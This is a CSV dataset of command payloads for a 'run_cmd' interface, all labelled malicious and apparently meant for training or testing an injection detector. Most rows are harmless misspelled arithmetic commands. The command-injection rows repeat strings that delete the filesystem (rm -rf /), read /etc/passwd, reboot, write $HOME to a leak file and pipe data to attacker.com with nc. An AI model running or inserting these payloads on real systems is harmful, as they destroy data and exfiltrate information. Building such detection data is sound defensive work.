payload,label,attack_type
"run_cmd, SUBB 48 58",malicious,cmd_parse_error
"run_cmd, SUM -83 0",malicious,cmd_parse_error
"run_cmd, SUM 61 21",malicious,cmd_parse_error
"run_cmd, AD 5 22",malicious,cmd_parse_error
"run_cmd, AD -58 57",malicious,cmd_parse_error
"run_cmd, ADDd -3 63",malicious,cmd_parse_error
"run_cmd, PLUS -87 10",malicious,cmd_parse_error
"run_cmd, SU -57 -10",malicious,cmd_parse_error
"run_cmd, ADDd -37 -38",malicious,cmd_parse_error
"run_cmd, AD 5 30",malicious,cmd_parse_error
"run_cmd, SUM 32 -66",malicious,cmd_parse_error
"run_cmd, SUBB 86 81",malicious,cmd_parse_error
"run_cmd, SUM 86 57",malicious,cmd_parse_error
"run_cmd, AD -41 95",malicious,cmd_parse_error
"run_cmd, AD -54 78",malicious,cmd_parse_error
"run_cmd, PLUS 5 -83",malicious,cmd_parse_error
"run_cmd, PLUS -26 -98",malicious,cmd_parse_error
"run_cmd, ADDd -70 61",malicious,cmd_parse_error
"run_cmd, SU -79 11",malicious,cmd_parse_error
"run_cmd, SUBB -77 -6",malicious,cmd_parse_error
"run_cmd, PLUS -31 83",malicious,cmd_parse_error
"run_cmd, PLUS 35 -48",malicious,cmd_parse_error
"run_cmd, SUBB -45 15",malicious,cmd_parse_error
"run_cmd, PLUS -77 24",malicious,cmd_parse_error
"run_cmd, PLUS -63 31",malicious,cmd_parse_error
"run_cmd, SU -5 -55",malicious,cmd_parse_error
"run_cmd, SU 37 -9",malicious,cmd_parse_error
"run_cmd, PLUS -99 42",malicious,cmd_parse_error
"run_cmd, SUM 58 -88",malicious,cmd_parse_error
"run_cmd, AD 71 -21",malicious,cmd_parse_error
"run_cmd, AD 71 1",malicious,cmd_parse_error
"run_cmd, AD -40 24",malicious,cmd_parse_error
"run_cmd, AD 23 -99",malicious,cmd_parse_error
"run_cmd, AD -2 -19",malicious,cmd_parse_error
"run_cmd, SUBB -41 -12",malicious,cmd_parse_error
"run_cmd, AD 19 -54",malicious,cmd_parse_error
"run_cmd, SUM 61 60",malicious,cmd_parse_error
"run_cmd, SUM 20 -52",malicious,cmd_parse_error
"run_cmd, SUM 3 -84",malicious,cmd_parse_error
"run_cmd, SUBB 19 16",malicious,cmd_parse_error
"run_cmd, SUM 89 -65",malicious,cmd_parse_error
"run_cmd, SUM 87 52",malicious,cmd_parse_error
"run_cmd, PLUS 89 -10",malicious,cmd_parse_error
"run_cmd, AD 74 94",malicious,cmd_parse_error
"run_cmd, SUBB 77 14",malicious,cmd_parse_error
"run_cmd, AD -24 -13",malicious,cmd_parse_error
"run_cmd, PLUS 23 97",malicious,cmd_parse_error
"run_cmd, SU 17 -55",malicious,cmd_parse_error
"run_cmd, ADDd 7 -67",malicious,cmd_parse_error
"run_cmd, AD -29 -24",malicious,cmd_parse_error
"run_cmd, SUBB 30 -67",malicious,cmd_parse_error
"run_cmd, SUM -83 29",malicious,cmd_parse_error
"run_cmd, SU 50 -10",malicious,cmd_parse_error
"run_cmd, PLUS 43 22",malicious,cmd_parse_error
"run_cmd, AD -23 -65",malicious,cmd_parse_error
"run_cmd, SUBB 87 -78",malicious,cmd_parse_error
"run_cmd, PLUS 10 84",malicious,cmd_parse_error
"run_cmd, AD 58 -89",malicious,cmd_parse_error
"run_cmd, PLUS 17 72",malicious,cmd_parse_error
"run_cmd, SUM -30 -13",malicious,cmd_parse_error
"run_cmd, AD -24 -13",malicious,cmd_parse_error
"run_cmd, SU -51 -64",malicious,cmd_parse_error
"run_cmd, SU -13 -1",malicious,cmd_parse_error
"run_cmd, SUM 48 79",malicious,cmd_parse_error
"run_cmd, SU 64 -62",malicious,cmd_parse_error
"run_cmd, SUM -70 64",malicious,cmd_parse_error
"run_cmd, SUBB -62 -99",malicious,cmd_parse_error
"run_cmd, SU 13 88",malicious,cmd_parse_error
"run_cmd, SUM 51 8",malicious,cmd_parse_error
"run_cmd, SUBB -4 -5",malicious,cmd_parse_error
"run_cmd, SUM -84 49",malicious,cmd_parse_error
"run_cmd, AD 39 -62",malicious,cmd_parse_error
"run_cmd, SUM -60 95",malicious,cmd_parse_error
"run_cmd, SU -37 -85",malicious,cmd_parse_error
"run_cmd, PLUS -43 0",malicious,cmd_parse_error
"run_cmd, ADDd -37 26",malicious,cmd_parse_error
"run_cmd, SU -72 59",malicious,cmd_parse_error
"run_cmd, ADDd 47 89",malicious,cmd_parse_error
"run_cmd, PLUS -100 64",malicious,cmd_parse_error
"run_cmd, ADDd 69 -40",malicious,cmd_parse_error
"run_cmd, ADDd -81 -6",malicious,cmd_parse_error
"run_cmd, ADDd 7 12",malicious,cmd_parse_error
"run_cmd, PLUS -5 45",malicious,cmd_parse_error
"run_cmd, ADDd 90 41",malicious,cmd_parse_error
"run_cmd, PLUS 57 22",malicious,cmd_parse_error
"run_cmd, SU 97 48",malicious,cmd_parse_error
"run_cmd, AD 20 -30",malicious,cmd_parse_error
"run_cmd, SUM 32 -31",malicious,cmd_parse_error
"run_cmd, ADDd -41 -76",malicious,cmd_parse_error
"run_cmd, SUBB 54 -55",malicious,cmd_parse_error
"run_cmd, SUBB 37 -88",malicious,cmd_parse_error
"run_cmd, SUBB 24 15",malicious,cmd_parse_error
"run_cmd, SU -43 39",malicious,cmd_parse_error
"run_cmd, AD -77 16",malicious,cmd_parse_error
"run_cmd, SUM 79 84",malicious,cmd_parse_error
"run_cmd, SU -66 -40",malicious,cmd_parse_error
"run_cmd, AD -83 -56",malicious,cmd_parse_error
"run_cmd, AD 35 37",malicious,cmd_parse_error
"run_cmd, SUBB -96 -58",malicious,cmd_parse_error
"run_cmd, AD 9 33",malicious,cmd_parse_error
"run_cmd, SUM -6 0",malicious,cmd_parse_error
"run_cmd, ADDd -97 55",malicious,cmd_parse_error
"run_cmd, ADDd 89 31",malicious,cmd_parse_error
"run_cmd, SUM -30 12",malicious,cmd_parse_error
"run_cmd, SUM 88 77",malicious,cmd_parse_error
"run_cmd, SU -36 65",malicious,cmd_parse_error
"run_cmd, SUM -72 -4",malicious,cmd_parse_error
"run_cmd, ADDd 4 34",malicious,cmd_parse_error
"run_cmd, ADDd 28 -40",malicious,cmd_parse_error
"run_cmd, ADDd 71 -92",malicious,cmd_parse_error
"run_cmd, ADDd 98 64",malicious,cmd_parse_error
"run_cmd, SU -25 -53",malicious,cmd_parse_error
"run_cmd, SUBB -17 0",malicious,cmd_parse_error
"run_cmd, SUBB 20 -90",malicious,cmd_parse_error
"run_cmd, AD -30 -11",malicious,cmd_parse_error
"run_cmd, AD -1 14",malicious,cmd_parse_error
"run_cmd, PLUS 41 -50",malicious,cmd_parse_error
"run_cmd, SU 28 -22",malicious,cmd_parse_error
"run_cmd, PLUS -21 -82",malicious,cmd_parse_error
"run_cmd, ADDd 76 88",malicious,cmd_parse_error
"run_cmd, SU 98 -51",malicious,cmd_parse_error
"run_cmd, AD -42 35",malicious,cmd_parse_error
"run_cmd, PLUS -73 24",malicious,cmd_parse_error
"run_cmd, PLUS -40 94",malicious,cmd_parse_error
"run_cmd, SUM 61 94",malicious,cmd_parse_error
"run_cmd, SUBB 64 73",malicious,cmd_parse_error
"run_cmd, SUM 52 -35",malicious,cmd_parse_error
"run_cmd, SUBB 96 8",malicious,cmd_parse_error
"run_cmd, AD 87 -13",malicious,cmd_parse_error
"run_cmd, ADDd 20 6",malicious,cmd_parse_error
"run_cmd, AD -33 -72",malicious,cmd_parse_error
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo user `whoami`",malicious,cmdi
"run_cmd, echo ls > out.txt && cat out.txt",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo hello; rm -rf /",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
"run_cmd, echo sensor | nc attacker.com 4444",malicious,cmdi
"run_cmd, echo ping 8.8.8.8 && reboot",malicious,cmdi
"run_cmd, echo check $HOME > /tmp/leak",malicious,cmdi
"run_cmd, echo ok && echo hacked",malicious,cmdi
"run_cmd, echo status | cat /etc/passwd",malicious,cmdi
